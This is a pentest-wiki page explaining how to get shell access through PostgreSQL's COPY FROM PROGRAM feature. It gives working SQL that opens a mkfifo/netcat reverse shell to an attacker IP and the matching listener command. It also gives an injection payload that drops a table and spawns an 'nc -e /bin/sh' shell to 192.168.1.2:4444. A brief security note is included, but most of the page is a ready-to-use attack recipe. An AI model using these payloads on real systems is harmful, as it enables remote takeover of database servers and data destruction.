---
cover: >-
  https://images.unsplash.com/photo-1517486430290-35657bdcef51?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw5fHxlbGVwaGFudHMlMjB8ZW58MHx8fHwxNzE1NDU1NzIyfDA&ixlib=rb-4.0.3&q=85
coverY: 0
---

# PostgreSQL

To execute system commands on Linux or Windows using PostgreSQL, you can leverage the `PROGRAM` parameter in conjunction with the `COPY` command. Here's a step-by-step explanation of how to set up and use this method:

#### Command Execution Overview

The process starts with the creation of a table designed to store the output of the commands you execute. This can be a temporary or permanent table based on your requirements. Here, we'll create a permanent table called `shell`.

**Step 1: Create a Table to Capture Output**

First, create a table where the output of the executed commands will be stored. This table will have a single column to hold text data.

```sql
CREATE TABLE shell(output text);
```

**Step 2: Using the PROGRAM Parameter to Execute Commands**

With the table ready, you can now use the `PROGRAM` parameter within the `COPY` command to execute system-level commands. This example demonstrates how to set up a reverse shell, which allows you to execute commands remotely on the server where the PostgreSQL database is running.

```sql
COPY shell FROM PROGRAM 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f';
```

Here's a breakdown of the command sequence:

* `rm /tmp/f;`: Removes any existing file named `/tmp/f`.
* `mkfifo /tmp/f;`: Creates a named pipe `/tmp/f`. Named pipes allow for temporary file-like communication between processes.
* `cat /tmp/f | /bin/sh -i 2>&1`: This part sets up a reverse shell. It reads from the named pipe, executes commands using the shell (`/bin/sh -i`), and redirects both stdout and stderr to the pipe.
* `nc 10.0.0.1 1234 > /tmp/f`: This uses `netcat` (nc) to connect back to the attacker's machine listening on IP `10.0.0.1` and port `1234`. Output from the shell (connected via `nc`) is redirected back into `/tmp/f`, thus maintaining a continuous shell session.

**Step 3: Set Up a Listener on the Attacking Machine**

Before running the `COPY` command, ensure that you've set up a listener on the attacking machine to accept the incoming connection from the reverse shell:

```bash
nc -lvp 1234
```

This command tells `netcat` to listen on port `1234`, verbosely displaying output and keeping the port open for multiple connections if needed.

#### Security Considerations

Executing system commands via SQL in a database is a significant security risk and typically indicates that your system is already compromised or misconfigured to allow such actions. Always ensure that database permissions are strictly managed and that using features like `COPY FROM PROGRAM` is disabled unless absolutely necessary and safeguarded by robust security measures.



Example:

{% code overflow="wrap" %}
```sql
id=';DROP TABLE IF EXISTS commandexec; CREATE TABLE commandexec(data text);COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/sh 192.168.1.2 4444';--
```
{% endcode %}

#### Resource(s):

* [https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767)
